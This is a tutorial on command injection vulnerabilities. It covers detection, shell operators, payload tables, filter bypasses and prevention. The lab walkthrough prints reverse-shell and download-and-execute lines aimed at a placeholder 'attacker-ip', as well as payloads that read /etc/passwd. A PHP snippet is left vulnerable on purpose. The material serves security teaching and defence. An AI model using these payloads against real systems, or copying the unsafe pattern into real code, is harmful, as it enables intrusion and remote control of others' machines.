# Command Injection vulnerabilities

---

## Table of Contents

1. **Introduction to Command Injection**
2. **How Applications Become Vulnerable**
3. **Discovery of Command Injection**
   - 3.1 Blind Command Injection
   - 3.2 Verbose Command Injection
4. **Testing & Exploiting**
   - 4.1 Shell Operators & Payload Chaining
   - 4.2 Useful Payloads for Linux & Windows
5. **Prevention Techniques**
   - 5.1 Avoiding Dangerous Functions & Libraries
   - 5.2 Input Sanitization & Validation
   - 5.3 Filtering & Escaping
6. **Bypassing Filters**
7. **Practical Walkthrough / Lab Example**
8. **Conclusion**

---

## 1. Introduction to Command Injection

**Command Injection** (sometimes referred to as **Remote Code Execution**, or RCE) is a critical vulnerability that arises when applications pass user-supplied input directly into operating system commands. When exploited, an attacker can execute arbitrary system commands with the same privileges as the vulnerable application, often leading to complete compromise of the system.

### Why is Command Injection so dangerous?
- Attackers can exfiltrate sensitive data (e.g., passwords, tokens, configuration files).
- Attackers can gain persistence via reverse shells or other backdoor mechanisms.
- It often leads to full system compromise if the application runs with elevated privileges.

Because of the high impact, command injection is consistently ranked as one of the most critical security flaws in web applications (e.g., mentioned in the OWASP Top 10).

---

## 2. How Applications Become Vulnerable

Web applications often need to interact with the underlying operating system. This can be done in various programming languages (e.g., PHP, Python, NodeJS, Ruby, etc.) through built-in functions or libraries that invoke system commands:

- **PHP**: `exec`, `system`, `passthru`, `shell_exec`
- **Python**: `os.system`, `subprocess.Popen`, `subprocess.run`
- **NodeJS**: `child_process.exec`, `child_process.spawn`

Vulnerabilities arise when the **user’s input** is not properly sanitized or validated and is directly appended to or interpolated into command strings. For example:

```php
<?php
    // Hypothetical snippet
    $title = $_GET['title'];  // user input from a GET param
    // The system call includes the user input:
    // "grep $title songtitle.txt"
    system("grep " . $title . " songtitle.txt");
?>
```

An attacker could supply a malicious payload—e.g., `$(cat /etc/passwd)` or `The Beatles; cat /etc/passwd`—thus injecting commands beyond the intended `grep` usage.

---

## 3. Discovery of Command Injection

### 3.1 Blind Command Injection
**Blind command injection** occurs when the command executes successfully, but you do **not** see any direct output. You suspect the application might be vulnerable if it takes unusually long to respond or shows other side effects.

**Common techniques**:
- **Time-based testing** with commands like `ping` or `sleep` (on Linux) or `timeout` (on Windows).
  - Inject `ping -c 10 127.0.0.1` (Linux) or `ping -n 10 127.0.0.1` (Windows) to see if the page “hangs” for that many seconds.
- **File redirection** to force the creation of a file with output, then attempt to read the file (e.g., `command > /tmp/output`).
- **DNS callbacks** using `curl` or `ping` to an attacker-controlled server. This can confirm execution.

### 3.2 Verbose Command Injection
**Verbose command injection** is simpler to detect because the application directly displays the output of the system command. You may see the direct response of something like `whoami` or `ls` on the page.

---

## 4. Testing & Exploiting

### 4.1 Shell Operators & Payload Chaining
Operators like `;`, `&`, `&&`, `||`, `|`, and backticks (`` ` ``) can be used to chain or inject additional commands. For example:

- **Linux/UNIX**:
  - `;` – execute multiple commands sequentially.
  - `&&` – only proceed if the previous command was successful.
  - `|` – pipe output of one command as input to another.
  - `` `command` `` – captures the output of one command to be used in another.

- **Windows**:
  - `&` – executes multiple commands one after the other.
  - `&&` – only proceed if the previous command was successful.
  - `|` – pipe output to the next command.

**Example Payload**:
If an application is searching for a song called “The Beatles”, you might try:
```
The Beatles; whoami
```
or, encoded for a URL query parameter,
```
search=The%20Beatles%3B%20whoami
```
to see which user the web application runs under.

### 4.2 Useful Payloads for Linux & Windows

#### Linux
| Payload   | Description                                                                                                                   |
|-----------|-------------------------------------------------------------------------------------------------------------------------------|
| `whoami`  | Shows which user the application is running under.                                                                            |
| `ls`      | Lists the contents of the current directory (may yield configuration files, credentials, environment variables, etc.).        |
| `ping`    | Can cause the system to “hang” or delay if repeated multiple times, useful for detecting blind command injection.             |
| `sleep`   | Another delay mechanism—useful if `ping` is unavailable.                                                                      |
| `nc`      | `netcat` can be used to spawn a reverse shell back to the attacker for interactive access to the system.                      |

#### Windows
| Payload   | Description                                                                                                                   |
|-----------|-------------------------------------------------------------------------------------------------------------------------------|
| `whoami`  | Shows which user the application is running under.                                                                            |
| `dir`     | Lists the contents of the current directory (may yield sensitive files or other leads).                                       |
| `ping`    | Useful for delaying the application (e.g., `ping -n 10 127.0.0.1`).                                                           |
| `timeout` | Another useful method of producing a delay if `ping` is unavailable.                                                          |

---

## 5. Prevention Techniques

### 5.1 Avoiding Dangerous Functions & Libraries
In **PHP**, functions such as `exec`, `passthru`, and `system` can be very dangerous if not used carefully. The same holds true for **Python**’s `os.system` or `subprocess` calls, **NodeJS**’s `exec`, etc.

- **Rule of thumb**: **Avoid** (or strictly limit) calling shell commands from your code. If you must, do so via a **safe API** or properly validated parameters.

### 5.2 Input Sanitization & Validation
**Whitelisting** approaches (accept only known-good patterns) generally work better than blacklisting:

- For numeric input, use a regex that only accepts digits: `^[0-9]+$`
- For text input, remove or escape special characters: `; | & \` etc.
- In PHP, you can use `filter_var()` or `filter_input()` to validate input as integers, email addresses, URLs, etc.

```php
<?php
    $user_input = $_GET['number'];
    if (filter_var($user_input, FILTER_VALIDATE_INT) !== false) {
        // Process further since it's a valid integer
        system("echo $user_input");
    } else {
        echo "Invalid input.";
    }
?>
```

### 5.3 Filtering & Escaping
If your use case genuinely requires user input in a command, ensure that special characters are escaped or removed. Some languages offer built-in escaping functions:
- **Python**: `shlex.quote()`
- **PHP**: `escapeshellarg()`, `escapeshellcmd()`
- **NodeJS**: Use `spawn` with arguments array rather than `exec` with raw strings.

---

## 6. Bypassing Filters

Even if filters are in place, attackers may try to circumvent them:
- **Hex/Unicode encoding**: Replace suspicious characters (like `;` or `&`) with their encoded forms (e.g., `%3B`).
- **Double-encoding**: Pass characters through multiple URL-encodings.
- **Case variations** or whitespace tricks** (e.g., `cat`, `cAt`, or using tabs, newlines).
- **Environmental variable expansions**: In some shells, referencing environment variables can help bypass filters that look for explicit commands.

For instance, if an application strips out quotes, you might try using `IFS` (the internal field separator in Unix-like systems) or parameter expansions.

---

## 7. Practical Walkthrough / Lab Example

Below is a simple guided scenario demonstrating how you might apply these principles in a controlled lab environment. Assume you have access to a target web application at `http://example.app/search` which triggers a backend shell command that uses your input.

1. **Initial Testing**
   - Enter a normal search term, e.g., `The Beatles`. The application returns a message about whether the song is found or not.
   - Notice the response times or any suspicious behavior.

2. **Blind Injection Check**
   - Attempt `The Beatles; ping -c 5 127.0.0.1` (Linux) or `The Beatles & ping -n 5 127.0.0.1` (Windows).
   - If the application “hangs” for 5 seconds, this strongly indicates the presence of blind command injection.

3. **Verbose Injection Check**
   - Attempt `The Beatles; whoami`.
   - If it directly displays `joe` or `www-data` or something similar, you have discovered verbose command injection.

4. **Escalating the Attack**
   - After confirming command injection, try listing the directory using `ls` or `dir`.
   - Check for interesting files (e.g., `.env`, `config.php`, `database.yml`, etc.).
   - Attempt to spawn a reverse shell:
     ```bash
     The Beatles; nc attacker-ip 4444 -e /bin/sh
     ```
     or if netcat does not support `-e`, try a bash-based reverse shell:
     ```bash
     The Beatles; bash -i >& /dev/tcp/attacker-ip/4444 0>&1
     ```
   - On Windows, you can try:
     ```bat
     The Beatles & powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/payload.ps1')"
     ```
     to download and execute a malicious script.

5. **Closing & Cleanup**
   - Remove any files you created, or ensure you leave no traces if this is a real penetration test environment. In a lab environment, proceed with documentation only.

---

## 8. Conclusion

**Command Injection** is among the most dangerous vulnerabilities because it grants attackers direct interaction with the system’s OS. Mastering both the **discovery** (blind vs. verbose) and the **exploitation** (payload chaining, advanced operators) phases is critical for penetration testers. For defenders and developers, the best way to mitigate command injection is by **limiting or avoiding dangerous functions**, **careful input validation**, and consistent **sanitization/escaping**.

### Key Takeaways:
1. **Always sanitize and validate** user input, especially if it will end up in a shell command.
2. **Prefer built-in language functions** that do not invoke the shell or that properly escape arguments.
3. **Monitor for suspicious behavior**, such as unusual response times, unexpected file creations, or external callbacks.
4. **Harden your environment** so that even if an injection occurs, the application’s privileges are limited (e.g., running with a non-privileged user like `www-data` in Linux).

---

**Additional Resources**
- [OWASP Command Injection Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Command_Injection_Defense_Cheat_Sheet.html)
- [Command Injection Payload List](https://github.com/payloadbox/command-injection-payload-list)
- [Netcat Reverse Shell Examples](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)










